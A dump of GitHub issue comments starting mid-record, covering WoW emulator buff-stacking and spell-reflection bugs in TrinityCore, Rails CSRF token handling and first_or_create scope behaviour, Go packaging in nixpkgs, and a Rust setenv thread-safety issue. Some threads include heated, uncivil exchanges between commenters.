Inspiration) ''Does not Stack as far as i know, but not 100% sure'' '''10% Physical Damage Incoming''' Provided by Shaman (Ancestral Healing), Priest (Inspiration) ''Not tested yet'' '''3% Damage Incoming''' Provided by Paladin (Blessing of Sanctuary), Priest (Renewed Hope), Warrior (Vigiliance) ''Not tested yet'' '''5% Spell Haste''' Provided by Shaman (Wrath of Air Totem), Druid (Improved Moonkin Form) ''Not tested yet'' The rest work as intended as far as i know. I hope i can test the untested things soon, so i can update them. ",,False
TrinityCore/TrinityCore/1225/1186049,1225,"Author mark07 As you can read [ here], it's right that the armor bonus from Devotion Aura stacks with Stoneskin Totem. ",,False
TrinityCore/TrinityCore/1225/1186050,1225,Author kbinside half of things you write should stack. ,,False
TrinityCore/TrinityCore/1225/1186052,1225,"Author tehacy Please check your your Informations before writting such shit! When you're the opinion that someone made a fault, prove or at least explain why its wrong like mark07 (btw thanks for this information), but with this attitude please go trolling somewhere else. 5%crit shouldnt stack (physical and spell) -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  Mulitplier shouldnt stack -&gt;  to explain it These two Buffs should both be able to stack on a Raidmember but because of the partially different buffs they offer, but the Strength and Stamina part shouldnt stack Spell Power shouldnt stack -&gt;  (only discribed, that Flametongue and Wrath shouldnt stack), but  you can read this Demonic Pact does not stack with an elemental Shaman's Totem of Wrath 3%! Haste (Not 5% - shame on me - wasnt focused enough) shouldnt stack -&gt;  Damage shouldnt stack -&gt;  Physical Damage Incoming shouldnt stack -&gt;  Damage Incoming shouldnt stack -&gt;  damage reduction from Blessing of Sanctuary, Renewed Hope and Vigilance does not stack. The buffs stack, because they have other effects - mana replenishment, threat transfer, etc. - but the 3% damage reduction buffs do not stack. It's this way for pretty much every buff buffs that do exactly the same thing as each other, tend not to stack. Exception Stoneskin totem &amp; devo aura."") So the same thing as Blessing of Sanctuary and Kings. The Armor-Buff was my fault. I didnt checked it and trusted a raidmember. ",,False
TrinityCore/TrinityCore/1225/1425526,1225,"It would be very nice, if u get this aura stacking fixed. ",,False
TrinityCore/TrinityCore/1225/8932030,1225,Updated at  #7667 ,,False
TrinityCore/TrinityCore/7994/7401247,7994,"When you use addons like Gladius and enter to an arena before your teammates, they appear in Gladius like they were your enemies. Also happens with blizzard arena frames. Same problem ♢  rev. 2012-10-05 233116 +0200 (ca55807+) (Unix, Release) ",,False
TrinityCore/TrinityCore/7994/10983690,7994,Confirmed! Revision a7d8a65bd0a95f21f1e350cefbef94ace20f69ec Database TDB.335.49 (with latest updates) ,,False
TrinityCore/TrinityCore/7994/11040980,7994,Confirmed! ,,False
TrinityCore/TrinityCore/7994/11420849,7994,Confirmed. ,,False
TrinityCore/TrinityCore/7994/11431058,7994,CONFIRMED! ,,False
TrinityCore/TrinityCore/7994/12091349,7994," will fix it, only makes sense that way anyway imo BattlegroundMgr.cpp ",,False
TrinityCore/TrinityCore/7994/12476548,7994,"Working partially on a261231d3f345eb4cf4e4601cd1dba1506d6f989 Now only pets bug the partner interface (owner interface works fine), and the rest it's fine ",,False
TrinityCore/TrinityCore/7994/17422589,7994,"confirm, frame is bugged in rev ",,False
TrinityCore/TrinityCore/7994/20652100,7994,"Reopen this, confirm at 5a6eacfa3361c87c776915204caef9be2851486e ",,False
rails/rails/1917/1144319,1917,"It seems that at some point in time the code of the request forgery protection was modified in such a way, that the InvalidAuthenticityToken exception is not thrown anymore. This change was made in a very sloppy way, take a look at  exception class is still there, but the exception is not being thrown anymore, instead the handle_unverified_request method is being called, which by default just quietly resets the session (!?). This is a pain to debug if you happen to have a problem with token somewhere in the application, you just get logged out of the sudden without any apparent reason. What's worse is that the handle_unverified_request method is not at all documented and in fact the documentation still talks about throwing an exception ",,False
rails/rails/1917/1475280,1917,"From 3.1, Rails shows a warning in the logs when the session is reset. You are right about the api doc being outdated. You can change it in  if you wish. Or I'm sure someone will take it up and fix ) ",,False
rails/rails/1917/1475281,1917,"This is because of a security issue - read this for more information. Yes, the method could be documented better - you can contribute some via the docrails project if you'd like to. The docrails repository is a public access repo where anyone can submit documentation patches. ",,False
rails/rails/1917/1475302,1917,Why are you closing this issue? This is a serious problem and it was not fixed. Since when is it OK for Rails to have docs that are misleading and completely out of date? ,,False
rails/rails/1917/1475825,1917,Few more links  think that this request should be reopened if the doc is misleading. ,,False
rails/rails/1917/1476959,1917,I've made the change in docrails ,,False
rails/rails/1917/1477295,1917,"vijaydev Thanks! I think this change was made in a rather mindless way and it should also be fixed in the code. The InvalidAuthenticityToken class is still present in request_forgery_protection.rb, which makes controllers using old invalid token handling code like this work without a glitch, even through the exception is not thrown any more and this code simply stops working when upgrading to a Rails version which introduced this change (A minor revision breaks compatibility and it's not even mentioned neither in the release notes nor in the documentation!). Either the handle_unverified_request method should be removed and the exception should be thrown again (after resetting the session?), or the exception class should be removed from the code and from the tests. In fact the commit that introduced this patched the test controllers to throw the exception as it was in the past, but it seems not enough thought was given to everybody else applications and tests  the cause of my application randomly logging people out costed me a few days of work and it seems to me a part of a larger issue of a very careless attitude towards maintaining compatibility and not breaking existing functionality with the introduction of the newest kool-aid. Until recently I seldom had to dig into Rails code to find a problem occurring with my application, but when migrating to Rails 3.0 I find problem after problem of this kind, previously I have spent a week trying to spot a performance regression, which turned out to be caused by changes in PostgreSQLAdapter and made the application in concern work three to four times slower. Perhaps changes should be made and accepted with greater care... ",,False
rails/rails/1917/1477448,1917,"@friend thanks for that - any chance you can document the handle_unverified_request method? @friend I closed it because I knew that someone like @friend would fix it and if I left it open then before too long we'll be back to where we were with the LH tracker and we'd have HN articles screaming ""OMG! Rails has a thousand bugs"". As for the hyperbole in your reply - no it's not a serious problem, it's not the first time that docs have been incorrect (it won't be the last either) and I think ‘completely’ out of date is a little bit of exaggeration don't you think. I'm sorry you lost some time due to this but this kind of thing happens to all of us. ",,False
rails/rails/1917/1477550,1917,"You knew that someone would fix it and that's why you have closed it? I thought it works a bit differently, first someone fixes it, then you close the issue ^^ I think it is a serious problem if people are loosing days of work because of it, and if you look at the links posted above by paneq I'm not the only one affected by this. I also pointed out a specific, technical defect with the changes that were made which you have chosen to completely ignore. ",,False
rails/rails/1917/1477569,1917,"@friend I understand the frustration. I myself had suffered silent session resets and spent time on debugging. But let's not get carried away. Calling people's hard work mindless is not going to help anyone. And if I remember right, 3.0.4 was released primarily as a security fix release and this change was well advertised (on Google groups, rails blog etc). As for the code changes you mention, @friend or @friend might have a better understanding and they can take this discussion forward. ",,False
rails/rails/1917/1477596,1917,@friend Sure. Will doc that. ,,False
rails/rails/1917/1477622,1917,@friend the reason the exception is still there is so that you can override handle_unverified_request and raise it yourself. The reason that the code defaults to resetting the session is that the main class of requests affected by the change were API requests which generally weren't using sessions so it was better than starting to generate errors. Since it was a security flaw there was no choice other than to break backwards compatibility. ,,False
rails/rails/1917/1477733,1917,"@friend I don't really understand the logic here. I think the session is being reset because of the security issue itself (see  and that's fine. But there always was a way to customize the handling of the situation in which the token was invalid, and the way to do it was to use rescue_from as I have shown above and I'm pretty sure a lot of applications already do it this way. So, if you don't want a server error you can customize the method handling the exception and you're all fine. If the exception would be thrown after the session was reset it would be still OK security-wise, it would not break compatibility in this aspect and people would more easily understand why the sudden logging-out occurs. If you absolutely want to introduce a method for handling an invalid token, that's fine, but it should not be done in a bugfix release, should be documented in release notes and in this situation what exactly would be the point of raising this exception from your handle_unverified_request? Sincerly, it looks to me like this was done just to avoid heavier modifications in the Rails test suite. If the exception would be removed, then at least this rescue_from code that is just dead now, would at least cause a runtime error. ",,False
rails/rails/1917/1477876,1917,@friend Have a look at the release notes  It just says it's a security fix and there isn't a word about an upgrade procedure. The only place this was documented is a blog post ,,False
rails/rails/1917/1477989,1917,"To nitpick, what you call ""release notes"" is also a blog post. The links @friend provided also talks a lot more about this. ",,False
rails/rails/1917/1478125,1917,"As mentioned by others this change was deliberate.  We cannot raise exceptions in the unverified request scenario any more because we cannot whitelist API and Ajax requests like we did previously.  Because of this the default handler resets the session which prevents the bulk of the relevant attack vectors. However you do still need to be careful and we're clearly lacking documentation on the things you need to be careful with. @friend While I appreciate your frustration you seem to have missed that the entire reason that the releases were done was to address a serious, exploitable security flaw with the previous method.  We had to change it, and change it in a way that's backwards compatible.  Making the exception be raised by default would reject every single api request, which is clearly unacceptable. Unfortunately you couldn't even work around this using rescue_from because an API without a csrf_token is valid you don't want to abort processing, but for security reasons you still needed to fire the unverified request handler. ",,False
rails/rails/1917/1478192,1917,"@friend Ok, now I finally understand the rationale for this, perhaps parts of what you just said should also be part of documentation, so that it's harder for other people to miss the point as well. ",,False
rails/rails/1917/1478289,1917,"@friend If you wanted to have a go at documenting it, I'd appreciate it.  One of the problems is that as part of addressing the finer points of the flash vulnerability I no longer have any idea what is and isn't confusing to users who didn't spend a month brainstorming the problems and solutions ",,False
rails/rails/1917/1480525,1917,"@friend One thing I still don't understand is why the InvalidAuthenticityToken exception class was and still is kept in the code. If it were removed then people migrating to newer Rails versions would get an error from their rescue_from clause, like it is right now that clause just silently stops working. ",,False
rails/rails/1917/1488067,1917,"The exception is still there because if you don't have an API client you can override the handler method and make it raise that same exception.  This was covered in the release notes. On Fri, Jul 1, 2011 at 322 PM, sztywny reply@friend.github.com wrote --  Cheers Koz ",,False
rails/rails/1917/1488397,1917,"@friend And this is the part that I still think should be changed. Seldom do libraries (frameworks) provide exception classes that the API user ""might be willing to throw"". If Rails itself doesn't raise the exception, it should not be part of Rails. From what I understand there is anyhow no point in raising InvalidAuthenticityToken from handle_unverified_request, then adding a rescue_from and finally doing the actual handling of the invalid token situation in some additional method, because you can do all the handling directly in handle_unverified_request, returning false in case one wants to stop the processing (this should maybe be documented). The same with rendering a 422 or a 500 http code. And removing this exception class prevents old code from failing silently after a migration to a newer version of Rails, which I guess will keep hitting migrating people if it won't be fixed. ",,False
rails/rails/1917/1488531,1917,"@friend there are perfectly valid reasons for throwing the InvalidAuthenticityToken. For example you may be using the [Hoptoad] notification service and want to capture these errors. Now you could call the Hoptoad notifier yourself in  but why not just raise the error and let the built-in handler deal with it. And as @friend points out, if you're upgrading and you have a bunch of code elsewhere handling this then just raising this error is quicker and simpler as an upgrade than having to rewrite and move the code into . ",,False
nixpkgs/NixOS/1131/21661383,1131,"Currently packaging Go software is ugly, see ",,False
nixpkgs/NixOS/1131/39524841,1131,Anyone working on this? ,,False
nixpkgs/NixOS/1131/42922950,1131,"I can take a stab at this. Here's what I had in mind in terms of usage go-update = buildGoPackage (fetchgit {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; });  That is, it would merely wrap another derivation. How does that sound? I had an alternative idea that's a little more elaborate go-update = buildGoPackage {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; };  I could infer the repository type just as  does. I could see value in both approaches - if only I could come up with decent names... ",,False
nixpkgs/NixOS/1131/42932724,1131,"The first one () means that  can never be extended with other function arguments. Do Go packages always come from GitHub? Otherwise it's better to stick to the regular BTW, note that we now have a  function, which is preferable over  because it doesn't pull in Git as a dependency and is probably faster. ",,False
nixpkgs/NixOS/1131/43026622,1131,"Good point. The Go compiler has hard-coded support for Bitbucket, GitHub, Google Code and Launchpad, with the expected url formats documented under ""Remote import paths"". As a side rant, the Go community's lack of discipline around versioning is rather annoying (with the Go compiler reinforcing the ""just pull from master"" attitude, as it doesn't allow for specifying revisions/tags). I have a plan for a ""go2nix"" tool that, given a release date, will traverse the import graph looking for revisions of each dependency as close to the release date as possible, ultimately generating a nix expression. I feel almost dirty suggesting such a thing, but it seems like the most practical approach to Go package automation, given the lack versioned releases... Yes, I was very happy to see that commit the other day - very nice ). I'll hack on this a bit and see what you think. ",,False
nixpkgs/NixOS/1131/56573985,1131,I wrote a tool to address this go2nix I'll try to get it into nixpkgs soon. ,,False
nixpkgs/NixOS/1131/56574830,1131,"Btw all those symlinks are not needed in the ngrok example. GOPATH can be used instead, but I guess you know already. ",,False
nixpkgs/NixOS/1131/57696579,1131,"@friend ngrok's Makefile expects that it can spit out some source code in it's source tree, so it's actually easier to just dump all the go package sources into the same store path, rather than just having a GOPATH entry for each and needing to special case the ngrok directory. I figure there will be plenty of other projects that behave similarly, so I think it's easier to just pile everything into the same folder. ",,False
nixpkgs/NixOS/1131/135121306,1131,This is done. ,,False
TrinityCore/TrinityCore/19440/220818627,19440,"Description Spell Reflect is reflecting multiple ""ticks"" of channel spells like Arcane Missiles spell 42846 = [Arcane Missiles] spell 23920 = [Spell Reflection] Expected behaviour Spell Reflect should reflect the first ""tick"" only Steps to reproduce the problem  Put a mage and warrior in duel With talent  [Missile Barrage] (spellid=44401) active, use Arcane Missiles in a warrior with Spell Reflect active You should receive back 2 Missiles, instead 1  Is more easy reproduce if mage has a good hast rating Branch(es) 3.3.5 TC rev. hash/commit  21b2042840e05ebeba365c54d47c07c13fde123f ",,False
TrinityCore/TrinityCore/19440/293132139,19440,"i dont think so, before your spells rework, all missiles hit warrior and 0 was reflected xd ",,False
TrinityCore/TrinityCore/19440/293132706,19440,Is improved spell reflection speced during this? ,,False
TrinityCore/TrinityCore/19440/293133822,19440,Imp. spell reflection only affects party members ,,False
TrinityCore/TrinityCore/19440/293142514,19440," three first waves of arcane missiles will get reflected, and the next ones you will have to take. the drain life cast will just simply cancel, and he will have to use another global cooldown to cast it again. the drain soul cast will simply cancel, and he will have to use another global cooldown to cast it again. the mind flay cast will simply cancel, and he will have to use another global cooldown to cast it again.  ",,False
TrinityCore/TrinityCore/19440/293481045,19440,Bad issue tagged in commit ,,False
TrinityCore/TrinityCore/19440/303227170,19440,"@friend you said Expected behaviour Spell Reflection should reflect the first ""tick"" only Don't be stupid, @friend Spell Reflection should reflect all of the missiles. Have you even even researched this? ",,False
TrinityCore/TrinityCore/19440/303295707,19440,"No need to insult other users, if you think something is wrong just state it. ",,False
TrinityCore/TrinityCore/19440/303316482,19440,"Maybe if he researched it, I wouldn't have insulted him. ",,False
TrinityCore/TrinityCore/19440/303321020,19440,"Ok, bad attitude even warned, next time you will be blocked. ",,False
TrinityCore/TrinityCore/19440/303371777,19440," Btw, i will try some friend to check it on retail, i'm pretty sure it only should reflect the first ""tick"" I remember when i'm doing arena close to pre patch (wotlk-&gt;cata) and in middle of MOP my penance reflect only first tick. With more time i will search more videos too ) ",,False
TrinityCore/TrinityCore/19440/306172701,19440,yeah i cant find videos to to sustain my point... So updated issue description. Thanks lineagedr. ,,False
rust/rust-lang/27970/102666718,27970,"Like the documentation for our  (setenv) says, care must be taken with mutating environment variables in a multithreaded program. See this glibc bug #13271 that says getaddrinfo may call getenv. It looks like we have an unsynchronized call to getaddrinfo and this may cause trouble with glibc/Linux. Seeing glibc's attitude to setenv in multithreaded programs,  seems like a big hazard in general(?). Discovered as an issue tangential to #27966 cc @friend ",,False
rust/rust-lang/27970/134264717,27970,If we did take this route I'd want to convert the environment lock to a rwlock to ensure that we could at least have parallel dns queries. Also cc #27705. ,,False
rust/rust-lang/27970/134268078,27970,"Yeah, either way the situation is tricky. We get tangled up in glibc internals. ",,False
rust/rust-lang/27970/134273584,27970,I found the wording on this page also particularly interesting The getaddrinfo function is indeed marked with this tag ,,False
rust/rust-lang/27970/264624978,27970,"is just broken, as I commented on issue #24741 Even without low-level races,  is not quite safe because you can change a variable (such as ), do something, and change it back to the original value, without impacting something else in the process which runs at the same time. This problem would not go away if we provided thread-safe environment access at the libc layer. Therefore, I'm surprised the function isn't marked **. ",,False
rails/rails/9894/12368417,9894,"Running rails 4.0.0-beta1 on ruby 2.0.0-p1. It seems as though when you perform code like the below, the where clauses are inherited by any callbacks it runs. The above exhibits the problem. All of the below function as intended. By debugging on the rails console it reveals This also applies to the first_or_create methods. I'm yet to test the find_or_create methods or the rails 3.x series. Should I write this into an active_record test? Any advice as to where to start? I've created an example application with this problem here  Example class used below. ",,False
rails/rails/9894/15460003,9894,Hey @friend and thanks for your report. I'm not sure if this is actually a bug. This problem was reported before and you can follow the discussion here #7853 and here #7391. Those tickets were closed because it was the expected behavior. /cc @friend ,,False
rails/rails/9894/15460674,9894,Right if its working as intended thats fine. In Rails 3 I would have used find_or_create_by_full_name(full_name). I'm just playing with rails 4 a bit and most of the transition documentation said to change that to the where(hash).first_or_create_by. I didn't realise the existence of .find_or_create(hash) until looking into the ActiveRecord code to investigate. Did you want me to document how those methods work anywhere or how things should be changed for compatibilty? Unsure exactly how railsguides and the like work and what happens during changeover between major releases. ,,False
rails/rails/9894/15461025,9894,"If we settle that this is the expected behavior It totally makes sense to document it. The fact that already 3 reports were filed regarding the same problem shows that it's not as ""expected"" as it could be which makes documentation even more necessary. In my opinion the guides should explain how to get a 3.x app running on 4.0 without such complications. I think it would be good to promote . As the described scenario is a combination of different methods on relation it's kind of hard to put it into the rdocs. Methods that always run into this behavior like  could be a good place though. @friend @friend thoughts? ",,False
rails/rails/9894/15462752,9894,"Is  available in 3.2? I've been migrating across to the  recently in my 3.2 apps because it was available and was the way rails seemed to be moving forward. Just figured I'd add my 2c regarding how it looks. I did think the  syntax was really nice before this, especially being able to pass in a block for extra parameters. It looked a lot nicer than the original  methods since you construct it like any other relation and then tack on  to the end. It was the guides like that below and some others which suggested this as a drop in replacement.  idea of just doing  as a work around seems awkward and I would've expected to be equivalent to . I guess it ends up being a question of how often is this desired functionality, how often will it trip people up and how complex is it to ""fix"" right? ",,False
rails/rails/9894/15484398,9894,"Yeah, I think we should promote  since its behavior is closer to the dynamic finders. ",,False
rails/rails/9894/15657859,9894,"Jon implemented find_or_create_by on relation, so let's just document that. ",,False
rails/rails/9894/15952776,9894,"I agree. I kinda consider  and friends to be soft-deprecated, so we should definitely promote  and friends in the docs. ",,False
rails/rails/9894/15953660,9894,Want me to write something up to that effect in the Rails 4 release notes + upgrading ruby on rails guides? ,,False
rails/rails/9894/16114796,9894,"@friend if you want, please ",,False
rails/rails/9894/16501297,9894,I'm confused. Rails 4 Release Notes says this ( can be rewritten using find_or_create_by(...) or where(...).first_or_create.  Is this incorrect now? Considering that  is soft-deprecated? ,,False
rails/rails/9894/16501442,9894,"Let's say I had this Model.where(a 1, b 1).first_or_create(c 1)  How can I reproduce this behaviour with new methods? It's sad,  was really useful. ",,False
rails/rails/9894/16502865,9894,"I've updated docrails to try and reflect that the firstor* methods shouldn't be used as drop in replacements for the others. I don't know if there are similar issues with first_or_initialize, but I'm guessing there could be if you did specific things in an after_initialize block.  the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them. I can't comment on the soft deprecation status, but can comment on that code. As it stands it would work, but would be very dependent on any callbacks in your model as the scope of the where will effect them as well. If you didn't want to use them to prevent potential issues later you could rewrite it in one of the following ways I liked it the firstor* methods, but if they're too complicated or difficult to maintain I'm not overly attached to them. ",,False
rails/rails/9894/16502986,9894,"@friend Thank you, that was very helpful! thumbsup ",,False
rails/rails/9894/23222478,9894,Is this still a bug now after changes to  ? ,,False
rails/rails/9894/23223901,9894,@friend I agree that we should mention it in the upgrading guide. Then I think that we can close it. ,,False
rails/rails/9894/23225095,9894,Since @friend said the firstor methods are soft deprecated should we only mention the drop in replacements of findor_by() ? ,,False
rails/rails/9894/23225183,9894,I've done that already in  should I just merge that onto master of docrails? ,,False
rails/rails/9894/23282489,9894,@friend I have added  based on your changes. You can merge your changes after that gets reviewed. ,,False
rails/rails/9894/25235215,9894,"I don't understand how this issue has been closed. The first report didn't include any  methods as does not my issue #12305. How come they're related or is the documentation still not sufficiently written? Documentation only writes about those dynamic methods, but not telling anything that this code should not work as it did before♠Foo.where(name ""bar"").createFoo.where(name ""bar"").first_or_create(baz ""bar"")`. Are you trying to say with the documentation change which led of closing these issues, that the code above should also not work and it is expected behavior of changing the default scope of the class itself (not even singleton class)? ",,False
rails/rails/9894/25235694,9894,For reference I'm posting the example from #12305  I'll reopen as we did not change documentation for  in combination with scopes. ,,False
rails/rails/9894/25236325,9894,"As mentioned above, i don't think that the problem is only not being mentioned in the documentation, but the problem is that the class's scope itself is changed, which should not ever happen (unless specified explicitly with default scope, if i'm not mistaken). ",,False
rails/rails/9894/25236787,9894,"I dug around myself before creating this ticket. I was using first or create and found that it was calling first and then ORing the result with create. Thus the problem (as I saw it) was within the create method, so thats how I raised the issue. The reason this was an issue for me (and others) was because first_or_create was the recommended upgrade path from find_or_createby methods in rails 3. This had different behaviour to the original find_or_createby methods so instead I changed documentation to point at the newer find_or_create_by(hash) methods which had the same expected behaviour. I've got no idea if / when the behaviour of MyModel.query_scope.create was changed. Did it behave differently in previous versions of rails or is the comment more that it is unintuitive? ",,False
rails/rails/9894/25237000,9894,The example code i wrote in issue #12305 worked fine with ActiveRecord 3.x series. The problem arised when i upgraded to 4.0. ,,False
rails/rails/9894/35853571,9894,"It seems like the problem is that the lifecycle hooks/callbacks are being evaluated within a scope. What if we were to make all off these hooks be performed without scoped? That is, when would we need/want them to be performed inside a scope? ",,False
rails/rails/9894/44300178,9894,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False
rails/rails/9894/44303753,9894,The problem still exists in  - i can reproduce the problem with example described in #12305. ,,False
rails/rails/9894/44304398,9894,Thanks. We do have a fix for at  I'll link this issue there. ,,False
rails/rails/9894/68540659,9894,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False
rails/rails/9894/68591439,9894,The problem still exists in  - i can reproduce the problem with example described in #12305. ,,False
rails/rails/9894/125373181,9894,@friend Do you realize the bug has been open for 2 years and it's still not fixed? WOW... ,,False
rails/rails/9894/125401218,9894,"@friend its OSS, feel free to open a PR with a fix. Comments like that really aren't helpful. @friend @friend since this has been behaviour for all of the 4.x series is it worth reconsidering what intended behaviour should be given 5 is on the horizon? Possibly more people relying on this behaviour now than not. I'm not sure. ",,False
rails/rails/9894/125401451,9894,@friend Sorry don't want my name associated with rails/AR ;) ,,False
rails/rails/9894/125506531,9894,Too late. Your entitlement to the free labor of others is now a permanent marker in the annals of Rails. ,,False
rails/rails/9894/125680963,9894,"@friend lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;) ",,False
rails/rails/9894/125699659,9894,"Your friend is most welcome to join the community and help device a solution to their issue, if they can do so without your obnoxious entitlement. Please do be on your merry way to whatever community you've found that has either no issues or is willing to tolerate your attitude about them. ",,False
rails/rails/9894/125702073,9894,"@friend You're over reacting my friend, I'm just pointing out true facts. And that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally)  and I do believe that is that kind of attitude that leads to it. I'm sorry if you can't distinguish your allies from your enemies. ",,False
rails/rails/9894/125708411,9894,"Your ""true facts"" are as laughable as your claim of ""ally"". Rails is at this point a massive system with an incredibly strong, diligent, and ever-expanding community of users and contributors working on improving it. But there will always be bugs, and this particular bug just wasn't important enough to summon any effort to its fix. Ipso facto. Rails is not a vendor that owes you, or your friend, anything. It's a common space where everyone can contribute their own fixes and improvements, and in return enjoy that in kind from others. You contributed nothing but needless scorn and entitlement. That is not the behavior of an ""ally"". Your post-rationalization for this disgraceful behavior is that the truth of a fact like ""bug X has not been fixed for me in duration Y"" completely side-steps the point. That truth is both trivial and obvious. You're not providing any service of revelation by sharing. The tone in which you chose to, though, was indeed in bad intention. Your clearly meant to, and obviously continue to, belittle the work of thousands of contributors who share their work with all for free. And for what? Do you think anyone will be inspired to help your friend deal with this issue with greater haste because you huffed and puffed? Quite the contrary. Demanding the free labor of others with indignation is no way to inspire their charity. So, again, please pack your entitlement, your banal analysis of the health of Rails, and be gone. Shoo, shoo. ",,False
rails/rails/9894/125712333,9894,"Since we are discussing tends, these are interesting number about what you are complaining here  I think these numbers speak by their self. Yes, I'm aware that this issue is open for 2 years. In fact I'm aware of all the issues on the issue tracker. But my time is limited, my interest too and I try to focus my time on the things that most interest me, because after all I work here not because someone pays me, but because I love to work with this team and use my free time to help people. I'm also aware that this is not a trivial issue to fix and it will require a lot of work and it may break a lot of applications like @friend correctly pointed. I know It will be fixed eventually, because there are so many great people working on this framework that it is just matter of time. Every single day someone new starts to contribute to this framework and it is amazing how a little bit of encouragement can create amazing regular contributors like @friend @friend @friend @friend @friend @friend @friend just to name few. I really don't know if Rails is dying, but I don't care, because the machinery that runs this framework is more alive than ever. ",,False
rails/rails/9894/125713833,9894,"@friend indeed, this is something that we can just change on Rails 5. The issue is assigned to me, we already have some patches, @friend already touched this code too, so I believe we will get it fixed in time to Rails 5. ",,False
rails/rails/9894/125722544,9894,"@friend Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key. ♠Do you realize the bug has been open for 2 years and it's still not fixed?` IS a true fact, and if you want to laugh about it, feel free but then I really wonder what kind of leader you are for ""Your community"". As you see it was not address against anyone, it was just an open statement. I have not asked for anything, nor I said that you owe me anything. Do you think you're going to win that argument by insulting and trolling me? In my humble opinion you should focus on more important thing for ""Your community"" than attacking the ones that want to raise awareness. For my friends we found a way around it, so now it would just be helping ""Your community""... Again, I think your attitude is very disappointing far far away from constructive. You should learn that contributing to a project is not the only way to make it move forward (note that I do not claim I ever did), and you should be grateful to all the people that are still trying to make Rails a better word rather than trolling them for your own sake. ",,False
rails/rails/9894/125724321,9894,"In my experience that is not what happens. In fact this issue is an outlier, for the reasons that I already explained. So even with awareness the fix is still not trivial and I doubt it will be fixed. ",,False
rails/rails/9894/125729656,9894,@friend I love statistics. Check this out ,,False
rails/rails/9894/125773865,9894,"You left out the  part of your quote, dude, which was kind of the finer end of your shitty point ",,False
rails/rails/9894/125776348,9894,"@friend stay polite please ;). And Yes WOW to express how surprise I was, did not bring much in the conversation, re-mentioning it felt useless to me (don't feed the trolls). Instead of trolling feel free to leave constructive comment and show that you're a grown man. To come back to what Rafael said, in my humble opinion having bug is one things, not documenting and letting them hide into the code is another one. ",,False
rails/rails/9894/125777001,9894,"If we document a bug it is not a bug anymore but a feature smile. Like I said this bug will die, when we think it is time. ",,False
rails/rails/9894/125778016,9894,😂😂 That's an extreme way of seeing things but why not... ,,False
rails/rails/9894/125784812,9894,Please leave these wonderful people alone. Myself and many others appreciate their work. ,,False
rails/rails/9894/125791951,9894,"Seriously, this guy has become a troll himself. The issue will be fixed when it's fixed. The Rails core team along with the entire community is constantly working on both features and bugs which amazes me.  Personally, I'm grateful for all of their hard work and sacrifice for the betterment of the framework. If people want to bitch and whine about a long standing ""bug"" then perhaps they should quit the rant, write some code, and create a PR.  Last time I checked the core team and contributors are not on some corporate payroll and are not obligated to do anything. They do it for the love of the framework and the community which I think is fabulous. Hopefully this thread dies, it's getting way out of hand. Myself and thousands others appreciate all you guys do! ",,False
rails/rails/9894/125800377,9894,"Certainly, this is just one of many issues with AR (the other one which comes to mind being rails/rails#9813 which can be ""solved"" by upgrading, which is not always a practical solution) I don't even recall the reason why I subscribed to this, but over time I learnt to be more defensive against the very framework itself (especially functionality that is obscure or only used by a minority). ",,False
rails/rails/9894/125801828,9894,"@friend good to hear. Doesn't worry me too much since I just found it when playing with pre release stuff. @friend if ever I'm like ""I wonder what happens when I..."" and I think the behaviour is a bit edge case-y I'll just write a test around the ""broader"" task I'm trying to accomplish. Caught a few bugs in similar cases where I've been relying upon edge cases which have changed during an upgrade. ",,False
rails/rails/9894/178286933,9894,@friend based on your comment in  should this issue also be closed since its currently targeting 5.0? ,,False
nixpkgs/NixOS/4952/48453048,4952,"I'm leaving this here in hopes that it'll be useful to someone. I didn't see anything in the NixOS manual that would indicate that I'd run into this class of problems while using it (granted, I've not read it in detail, but it's largely unreadable and overall, the whole codebase is poorly documented - attempting to discern the intent of the programmers isn't worth my time anymore, eg, where is the BNF form for the Nix language? What was so wrong with existing languages that a new one had to be invented. Where are the design documents? Perhaps I'm just not looking hard enough... in any case, looking hasn't proved useful, and reading the sources has revealed only a complete and utter disregard for quality.). Cheers. ",,False
nixpkgs/NixOS/4952/62652460,4952,"I tried building SBCL-1.2.5, cutting out the SB-POSIX tests until I can figure out something better. I'm betting that this is NixOS related. there were issues trying to run an XULrunner binary too for whatever it's worth. ",,False
nixpkgs/NixOS/4952/62653355,4952,"Some notes 1) For the overall design of the language and concepts, Eelco's papers are (for better or worse) the best place to look, I think. They describe the language, its motivations, and NixOS rather thoroughly. Some good starting points are Nix A Safe and Policy Free System for Software Development, and NixOS A Purely functional Linux distribution. It's been known for a while that unfortunately documentation is lacking on a few of these fronts. It's absolutely something we need to fix (I too think the NixOS on-boarding and beginner material is fairly sub-par). 2) Related to the above, there is no true BNF describing the Nix parser, unfortunately. This was a question raised recently in an attempt to write another Nix implementation in Haskell. A proper BNF is something that should be easy to add to the documentation somewhere. 3) I am confused by your inquiry about libraries being available. , , etc are all readily available in Nixpkgs (if they weren't, many other things would not be either). Your query of  does not tell you anything useful or meaningful. You must query the actual repository, which is described using Nix. For example $ nix-env -qa | egrep -i '(libx11|libxau)' libX11-1.6.2 libXau-1.0.8  In your paste of the Emacs  file, one dependency is specified as . This is not the same as  - indeed,  is actually a meta-package which encompasses the modular Xorg framework and many libraries, including , , , etc etc. You may determine this by looking at what the name  is bound to in  and seeing what other packages it incorporates. That said, I'm afraid I cannot help you with SBCL or StumpWM. I use neither. As it stands today, the NixOS community is structured such that all Nix users are, in essence, de-facto Nix developers. This community is still so small it is almost a requirement for you to use it regularly. In return, most of us believe the benefits are massive enough to deal with that. But it is not true of everyone. That is an understandably painful reality, but it's 